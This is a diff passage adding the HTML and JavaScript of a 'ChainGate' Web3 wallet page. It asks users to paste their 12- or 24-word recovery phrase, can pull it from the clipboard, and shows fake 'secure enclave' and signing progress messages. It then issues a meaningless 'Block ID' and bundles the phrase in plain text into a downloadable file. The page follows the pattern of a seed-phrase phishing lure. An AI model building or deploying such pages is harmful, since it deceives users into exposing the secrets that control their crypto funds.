+    <div class="step">Step 2 of 3</div>
+  </div>
+
+  <div class="card fade-in">
+    <h1 class="card-title">Enter your <span class="grad">12 /24 word</span></h1>
+    <p class="card-sub">Paste the exact recovery phrase you want to use for this temporary block ID.</p>
+
+    <div class="field">
+      <label for="dataInput">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        Your 12 /24 word
+      </label>
+
+      <textarea id="dataInput" placeholder="Paste your 12 or 24 word phrase here…"></textarea>
+    </div>
+
+    <div class="paste-row">
+      <button class="paste-btn" onclick="pasteFromClipboard()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path>
+          <rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect>
+        </svg>
+        Paste from clipboard
+      </button>
+    </div>
+
+    <div class="word-count" id="wordCount">Awaiting input</div>
+    <div class="error" id="inputError"></div>
+
+    <div class="gen-tab">
+      <button class="btn block" onclick="startGenerate()">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon>
+        </svg>
+        Generate Block ID
+      </button>
+    </div>
+  </div>
+</section>
+
+<!-- ============ PAGE 4 : GENERATE ============ -->
+<section class="page" id="page-generate">
+  <div class="page-head">
+    <button class="back" onclick="go('page-input')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <line x1="19" y1="12" x2="5" y2="12"></line>
+        <polyline points="12 19 5 12 12 5"></polyline>
+      </svg>
+      Back
+    </button>
+    <div class="step">Step 3 of 3</div>
+  </div>
+
+  <div class="card fade-in gen-card">
+    <div id="genLoading">
+      <div class="ring"></div>
+      <div class="gen-status" id="genStatus">Initializing secure enclave…</div>
+      <div class="gen-progress" id="genProgress">0%</div>
+    </div>
+
+    <div id="genSuccess">
+      <div class="success-ico">
+        <svg viewBox="0 0 24 24" width="46" height="46" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M4.5 12.5l5 5L19.5 7"></path>
+        </svg>
+      </div>
+
+      <h1 class="card-title center">Block ID <span class="grad">Generated</span></h1>
+      <p class="card-sub center">Your temporary identifier is ready. Copy it or download the ZIP bundle below.</p>
+
+      <div class="code-label">Your Code</div>
+      <div class="code-box" id="codeOut">—</div>
+
+      <div class="id-box" id="blockIdOut">—</div>
+
+      <div class="meta">
+        <div class="meta-item">
+          <span>Network</span>
+          <b id="metaNetwork">Ethereum Mainnet</b>
+        </div>
+        <div class="meta-item">
+          <span>Source</span>
+          <b id="metaSource">Manual entry</b>
+        </div>
+        <div class="meta-item">
+          <span>Type</span>
+          <b id="metaType">Temporary Block ID</b>
+        </div>
+        <div class="meta-item">
+          <span>Created</span>
+          <b id="metaCreated">—</b>
+        </div>
+      </div>
+
+      <div class="action-row">
+        <button class="action-btn" id="copyBtn" onclick="copyBlockId()">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+          </svg>
+          Copy Code
+        </button>
+
+        <button class="action-btn primary" onclick="downloadBlockZip()">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+            <polyline points="7 10 12 15 17 10"></polyline>
+            <line x1="12" y1="15" x2="12" y2="3"></line>
+          </svg>
+          Download ZIP
+        </button>
+
+        <button class="action-btn" onclick="resetFlow()">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="1 4 1 10 7 10"></polyline>
+            <path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10"></path>
+          </svg>
+          New Block
+        </button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="ticker">
+  <div class="ticker-in" id="ticker"></div>
+</div>
+
+<script>
+  let selectedWallet = 'Manual entry';
+  let currentBlockId = '';
+  let currentCode = '';
+  let currentPhrase = '';
+  let generateTimer = null;
+  let lastPhraseWords = 0;
+  let copyBtnOriginal = '';
+
+  const walletIcon = `
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <rect x="3" y="6" width="18" height="14" rx="4"></rect>
+      <path d="M3 10h18"></path>
+      <circle cx="17" cy="14" r="1.5"></circle>
+    </svg>
+  `;
+
+  const walletList = [
+    {name:'MetaMask', type:'Browser wallet'},
+    {name:'Trust Wallet', type:'Mobile wallet'},
+    {name:'Coinbase Wallet', type:'Mobile wallet'},
+    {name:'Phantom', type:'Mobile / browser'},
+    {name:'WalletConnect', type:'Protocol'},
+    {name:'Rainbow', type:'Browser wallet'},
+    {name:'Ledger', type:'Hardware wallet'},
+    {name:'Trezor', type:'Hardware wallet'},
+    {name:'Safe', type:'Smart account'},
+    {name:'Argent', type:'Mobile wallet'},
+    {name:'Math Wallet', type:'Mobile wallet'},
+    {name:'Frame', type:'Browser wallet'}
+  ];
+
+  const coinList = [
+    {id:'bitcoin', symbol:'BTC', name:'Bitcoin'},
+    {id:'ethereum', symbol:'ETH', name:'Ethereum'},
+    {id:'solana', symbol:'SOL', name:'Solana'},
+    {id:'cardano', symbol:'ADA', name:'Cardano'},
+    {id:'ripple', symbol:'XRP', name:'Ripple'},
+    {id:'polkadot', symbol:'DOT', name:'Polkadot'},
+    {id:'avalanche-2', symbol:'AVAX', name:'Avalanche'},
+    {id:'polygon', symbol:'POL', name:'Polygon'}
+  ];
+
+  const mockPrices = {
+    bitcoin:{usd:96420, usd_24h_change:1.8},
+    ethereum:{usd:3420, usd_24h_change:-0.6},
+    solana:{usd:182, usd_24h_change:3.1},
+    cardano:{usd:0.82, usd_24h_change:-1.2},
+    ripple:{usd:2.34, usd_24h_change:0.4},
+    polkadot:{usd:7.18, usd_24h_change:-2.1},
+    'avalanche-2':{usd:24.6, usd_24h_change:1.5},
+    polygon:{usd:0.42, usd_24h_change:0.9}
+  };
+
+  let priceData = JSON.parse(JSON.stringify(mockPrices));
+
+  function go(pageId){
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    const page = document.getElementById(pageId);
+    if(page) page.classList.add('active');
+    window.scrollTo({top:0, behavior:'auto'});
+
+    if(pageId === 'page-input'){
+      setTimeout(() => {
+        document.getElementById('dataInput').focus();
+      }, 350);
+    }
+  }
+
+  function initHeadline(){
+    const text = 'Secure Web3 Wallet Gateway for Non-Custodial Block IDs';
+    const el = document.getElementById('headline');
+    el.innerHTML = text.split(' ').map((word, i) => {
+      return `<span class="w" style="animation-delay:${i * 70}ms">${word}</span>`;
+    }).join(' ');
+  }
+
+  function animateCounts(){
+    const els = document.querySelectorAll('[data-count]');
+
+    els.forEach(el => {
+      const raw = el.dataset.count || '0';
+      const target = parseFloat(raw);
+      const prefix = el.dataset.prefix || '';
+      const suffix = el.dataset.suffix || '';
+      const decimals = (raw.split('.')[1] || '').length;
+      const duration = 1500;
+      const start = performance.now();
+
+      function tick(now){
+        const t = Math.min((now - start) / duration, 1);
+        const eased = 1 - Math.pow(1 - t, 3);
+        const value = target * eased;
+
+        el.textContent = prefix + value.toFixed(decimals) + suffix;
+
+        if(t < 1){
+          requestAnimationFrame(tick);
+        } else {
+          el.textContent = prefix + target.toFixed(decimals) + suffix;
+        }
+      }
+
+      requestAnimationFrame(tick);
+    });
+  }
+
+  function formatUsd(value){
+    if(value >= 1){
+      return value.toLocaleString('en-US', {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2
+      });
+    }
+
+    return value.toLocaleString('en-US', {
+      minimumFractionDigits: 4,
+      maximumFractionDigits: 4
+    });
+  }
+
+  function renderCoins(){
+    const grid = document.getElementById('coinGrid');
+
+    grid.innerHTML = coinList.map((coin, i) => {
+      const price = priceData[coin.id];
+      const change = price ? price.usd_24h_change : 0;
+      const changeClass = change >= 0 ? 'up' : 'down';
+      const arrow = change >= 0 ? '▲' : '▼';
+
+      return `
+        <div class="coin-card" style="animation-delay:${i * 50}ms">
+          <div class="coin-head">
+            <div class="coin-name">
+              ${coin.name}
+              <span class="coin-sym">${coin.symbol}</span>
+            </div>
+            <div class="coin-ico">${coin.symbol.slice(0, 3)}</div>
+          </div>
+          <div class="coin-price">$${formatUsd(price.usd)}</div>
+          <div class="coin-chg ${changeClass}">${arrow} ${Math.abs(change).toFixed(1)}% 24h</div>
+        </div>
+      `;
+    }).join('');
+  }
+
+  function renderTicker(){
+    const ticker = document.getElementById('ticker');
+
+    const items = coinList.map(coin => {
+      const price = priceData[coin.id];
+      const change = price.usd_24h_change;
+      const changeClass = change >= 0 ? 'up' : 'down';
+      const arrow = change >= 0 ? '▲' : '▼';
+
+      return `
+        <span>
+          ${coin.symbol} $${formatUsd(price.usd)}
+          <em class="${changeClass}">${arrow} ${Math.abs(change).toFixed(1)}%</em>
+        </span>
+      `;
+    }).join('');
+
+    ticker.innerHTML = items + items;
+  }
+
+  function updatePrices(){
+    Object.keys(priceData).forEach(id => {
+      const drift = (Math.random() - 0.5) * 0.004;
+      priceData[id].usd = Math.max(0.0001, priceData[id].usd * (1 + drift));
+      priceData[id].usd_24h_change = Math.max(
+        -9.9,
+        Math.min(9.9, priceData[id].usd_24h_change + (drift * 100))
+      );
+    });
+
+    renderCoins();
+    renderTicker();
+  }
+
+  function renderWallets(){
+    const grid = document.getElementById('walletGrid');
+
+    grid.innerHTML = walletList.map((wallet, i) => `
+      <button class="wallet" type="button" data-name="${wallet.name}" style="--d:${i * 45}ms">
+        <div class="ico">${walletIcon}</div>
+        <div class="nm">${wallet.name}</div>
+        <div class="ty">${wallet.type}</div>
+      </button>
+    `).join('');
+  }
+
+  function selectWallet(name){
+    selectedWallet = name;
+
+    document.querySelectorAll('#walletGrid .wallet').forEach(btn => {
+      btn.classList.toggle('selected', btn.dataset.name === name);
+    });
+
+    go('page-input');
+  }
+
+  function getPhraseWords(){
+    const textarea = document.getElementById('dataInput');
+    const words = textarea.value.trim().split(/\s+/).filter(Boolean).length;
+    lastPhraseWords = words;
+    return words;
+  }
+
+  function updateWordCount(){
+    const words = getPhraseWords();
+    const counter = document.getElementById('wordCount');
+    const error = document.getElementById('inputError');
+
+    if(words === 0){
+      counter.textContent = 'Awaiting input';
+      counter.className = 'word-count';
+    } else if(words === 12 || words === 24){
+      counter.textContent = `${words} words detected`;
+      counter.className = 'word-count ok';
+      error.classList.remove('show');
+    } else {
+      counter.textContent = `${words} words detected — expected 12 or 24`;
+      counter.className = 'word-count bad';
+    }
+  }
+
+  async function pasteFromClipboard(){
+    const textarea = document.getElementById('dataInput');
+    const error = document.getElementById('inputError');
+
+    try{
+      const text = await navigator.clipboard.readText();
+      textarea.value = text;
+      updateWordCount();
+      error.classList.remove('show');
+    } catch(err){
+      error.textContent = 'Clipboard access denied. Paste manually with Ctrl+V.';
+      error.classList.add('show');
+    }
+  }
+
+  function animateProgress(duration, onUpdate){
+    return new Promise(resolve => {
+      const start = performance.now();
+
+      const statuses = [
+        [0, 'Initializing secure enclave…'],
+        [18, 'Deriving temporary identity…'],
+        [42, 'Signing ephemeral payload…'],
+        [68, 'Committing block reference…'],
+        [92, 'Finalizing…'],
+        [100, 'Complete']
+      ];
+
+      function tick(now){
+        const t = Math.min((now - start) / duration, 1);
+        const pct = Math.floor(t * 100);
+
+        let status = statuses[0][1];
+        for(const [threshold, label] of statuses){
+          if(pct >= threshold){
+            status = label;
+          }
+        }
+
+        onUpdate(pct, status);
+
+        if(t < 1){
+          generateTimer = requestAnimationFrame(tick);
+        } else {
+          generateTimer = null;
+          resolve();
+        }
+      }
+
+      generateTimer = requestAnimationFrame(tick);
+    });
+  }
+
+  function randomHex(length){
+    const half = Math.ceil(length / 2);
+    const arr = new Uint32Array(half);
+
+    if(window.crypto && crypto.getRandomValues){
+      crypto.getRandomValues(arr);
+    } else {
+      for(let i = 0; i < half; i++){
+        arr[i] = Math.floor(Math.random() * 0xffffffff);
+      }
+    }
+
+    let out = '';
+    for(let i = 0; i < half; i++){
+      out += arr[i].toString(16).padStart(8, '0');
+    }
+
+    return out.slice(0, length);
+  }
+
+  function buildShortCode(blockId){
+    const hex = blockId.replace(/^0x/i, '').slice(0, 12);
+    return hex.match(/.{1,4}/g).join('-').toUpperCase();
+  }
+
+  async function createBlockId(phrase){
+    const payload = `${phrase}::${selectedWallet}::${Date.now()}`;
+
+    if(window.crypto && crypto.subtle){
+      try{
+        const digest = await crypto.subtle.digest(
+          'SHA-256',
+          new TextEncoder().encode(payload)
+        );
+        const bytes = new Uint8Array(digest);
+        return '0x' + Array.from(bytes)
+          .map(b => b.toString(16).padStart(2, '0'))
+          .join('');
+      } catch(err){
+        // Fall through to random generation.
+      }
+    }
+
+    return '0x' + randomHex(64);
+  }
+
+  async function startGenerate(){
+    const textarea = document.getElementById('dataInput');
+    const rawPhrase = textarea.value;
+    const phrase = rawPhrase.trim();
+    const words = phrase.split(/\s+/).filter(Boolean).length;
+    const error = document.getElementById('inputError');
+
+    if(words !== 12 && words !== 24){
+      error.textContent = `Please enter exactly 12 or 24 words. Detected ${words}.`;
+      error.classList.add('show');
+      return;
+    }
+
+    error.classList.remove('show');
+    go('page-generate');
+
+    const loading = document.getElementById('genLoading');
+    const success = document.getElementById('genSuccess');
+    const progress = document.getElementById('genProgress');
+    const status = document.getElementById('genStatus');
+
+    loading.style.display = 'block';
+    success.style.display = 'none';
+    progress.textContent = '0%';
+    status.textContent = 'Initializing secure enclave…';
+
+    await animateProgress(2400, (pct, label) => {
+      progress.textContent = `${pct}%`;
+      status.textContent = label;
+    });
+
+    currentBlockId = await createBlockId(phrase);
+    currentCode = buildShortCode(currentBlockId);
+    currentPhrase = rawPhrase;
+    const created = new Date().toISOString();
+
+    document.getElementById('codeOut').textContent = currentCode;
+    document.getElementById('blockIdOut').textContent = currentBlockId;
+    document.getElementById('metaNetwork').textContent = 'Ethereum Mainnet';
+    document.getElementById('metaSource').textContent = selectedWallet;
+    document.getElementById('metaType').textContent = 'Temporary Block ID';
+    document.getElementById('metaCreated').textContent = created;
+
+    loading.style.display = 'none';
+    success.style.display = 'flex';
+
+    copyBtnOriginal = document.getElementById('copyBtn').innerHTML;
+  }
+
+  async function copyBlockId(){
+    if(!currentCode) return;
+
+    const btn = document.getElementById('copyBtn');
+
+    try{
+      await navigator.clipboard.writeText(currentCode);
+      btn.innerHTML = 'Copied';
+    } catch(err){
+      const ta = document.createElement('textarea');
+      ta.value = currentCode;
+      ta.style.position = 'absolute';
+      ta.style.left = '-9999px';
+      document.body.appendChild(ta);
+      ta.select();
+      document.execCommand('copy');
+      document.body.removeChild(ta);
+      btn.innerHTML = 'Copied';
+    }
+
+    setTimeout(() => {
+      btn.innerHTML = copyBtnOriginal || 'Copy Code';
+    }, 1600);
+  }
+
+  function buildMarkdown(meta){
+    const lines = [
+      '# ChainGate Temporary Block ID',
+      '',
+      '## Code',
+      '',
+      '```text',
+      meta.code,
+      '```',
+      '',
+      '## Summary',
+      '',
+      `- **Code:** \`${meta.code}\``,
+      `- **Block ID:** \`${meta.blockId}\``,
+      `- **Network:** ${meta.network}`,
+      `- **Source:** ${meta.source}`,
+      `- **Type:** ${meta.type}`,
+      `- **Created:** ${meta.created}`,
+      `- **Generated At:** ${meta.generatedAt}`,
+      '',
+      '## Source Phrase (Plain Text)',
+      '',
+      'The text entered on the "Enter your 12 /24 word" page is recorded below exactly as typed:',
+      '',
+      '```text',
+      meta.sourcePhrase.trim(),
+      '```',
+      '',
+      `- **Word Count:** ${meta.sourcePhraseWordCount}`,
+      '',
+      '## Notes',
+      '',
+      meta.note,
+      ''
+    ];
+
+    return lines.join('\n');
+  }
+
+  function buildCodeFile(meta){
+    const lines = [
+      'ChainGate Code',
+      '',
+      `Code: ${meta.code}`,
+      `Block ID: ${meta.blockId}`,
+      '',
+      'Use this code to verify the temporary block reference.',
+      ''
+    ];
+
+    return lines.join('\n');
+  }
+
+  function buildPlainText(meta){
+    const lines = [
+      'ChainGate Temporary Block ID',
+      '',
+      `Code: ${meta.code}`,
+      `Block ID: ${meta.blockId}`,
+      `Network: ${meta.network}`,
+      `Source: ${meta.source}`,
+      `Type: ${meta.type}`,
+      `Created: ${meta.created}`,
+      `Generated At: ${meta.generatedAt}`,
+      '',
+      'Source Phrase (plain text):',
+      meta.sourcePhrase.trim(),
+      '',
+      `Word Count: ${meta.sourcePhraseWordCount}`,
+      '',
+      `Note: ${meta.note}`
+    ];
+
+    return lines.join('\n');
+  }
+
+  function triggerDownload(blob, filename){
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = filename;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    setTimeout(() => URL.revokeObjectURL(url), 1000);
+  }
+
+  async function downloadBlockZip(){
+    if(!currentBlockId) return;
+
+    const phraseWordCount = currentPhrase.trim().split(/\s+/).filter(Boolean).length;
+
+    const meta = {
+      code: currentCode,
+      blockId: currentBlockId,
+      network: 'Ethereum Mainnet',
+      source: selectedWallet,
+      type: 'Temporary Block ID',
+      created: document.getElementById('metaCreated').textContent,
+      generatedAt: new Date().toISOString(),
+      sourcePhrase: currentPhrase,
+      sourcePhraseTrimmed: currentPhrase.trim(),
+      sourcePhraseWordCount: phraseWordCount,
+      note: 'This bundle includes your code and the source phrase entered on the input page, stored in plain text inside block.md and code.txt.'
+    };
+
+    const filename = `chaingate-${meta.code}.zip`;
+
+    try{
+      if(typeof JSZip === 'undefined'){
+        throw new Error('JSZip library not loaded');
+      }
+
+      const zip = new JSZip();
+      zip.file('code.txt', buildCodeFile(meta));
+      zip.file('block.md', buildMarkdown(meta));
+      zip.file('block-id.txt', `${currentBlockId}\n`);
+      zip.file('metadata.json', JSON.stringify(meta, null, 2));
+      zip.file('README.txt', buildPlainText(meta));
+
+      const blob = await zip.generateAsync({type: 'blob'});
+      triggerDownload(blob, filename);
+    } catch(err){
+      // Guaranteed fallback: always hand the user a file, even if the zip engine fails.
+      const content = buildPlainText(meta);
+      const blob = new Blob([content], {type: 'text/plain'});
+      triggerDownload(blob, filename.replace('.zip', '.txt'));
+    }
+  }
+
+  function resetFlow(){
+    if(generateTimer){
+      cancelAnimationFrame(generateTimer);
+      generateTimer = null;
+    }
+
+    currentBlockId = '';
+    currentCode = '';
+    currentPhrase = '';
+    selectedWallet = 'Manual entry';
+    lastPhraseWords = 0;
+
+    const textarea = document.getElementById('dataInput');
+    textarea.value = '';
+    updateWordCount();
+
+    document.getElementById('inputError').classList.remove('show');
+
+    document.querySelectorAll('#walletGrid .wallet.selected').forEach(btn => {
+      btn.classList.remove('selected');
+    });
+
+    const loading = document.getElementById('genLoading');
+    const success = document.getElementById('genSuccess');
+
+    loading.style.display = 'block';
+    success.style.display = 'none';
+
+    document.getElementById('genProgress').textContent = '0%';
+    document.getElementById('genStatus').textContent = 'Initializing secure enclave…';
+    document.getElementById('codeOut').textContent = '—';
+    document.getElementById('blockIdOut').textContent = '—';
+
+    go('page-wallets');
+  }
+
+  function bindEvents(){
+    const textarea = document.getElementById('dataInput');
+    const walletGrid = document.getElementById('walletGrid');
+
+    textarea.addEventListener('input', updateWordCount);
+
+    walletGrid.addEventListener('click', e => {
+      const btn = e.target.closest('.wallet');
+      if(!btn) return;
+      selectWallet(btn.dataset.name);
+    });
+
+    walletGrid.addEventListener('mousemove', e => {
+      const btn = e.target.closest('.wallet');
+      if(!btn) return;
+
+      const rect = btn.getBoundingClientRect();
+      btn.style.setProperty('--mx', `${e.clientX - rect.left}px`);
+      btn.style.setProperty('--my', `${e.clientY - rect.top}px`);
+    });
+  }
+
+  document.addEventListener('DOMContentLoaded', () => {
+    initHeadline();
+    animateCounts();
+    renderWallets();
+    renderCoins();
+    renderTicker();
+    bindEvents();
+    updateWordCount();
+
+    copyBtnOriginal = document.getElementById('copyBtn').innerHTML;
+
+    setInterval(updatePrices, 30000);
+  });
+</script>
+</body>
+</html>
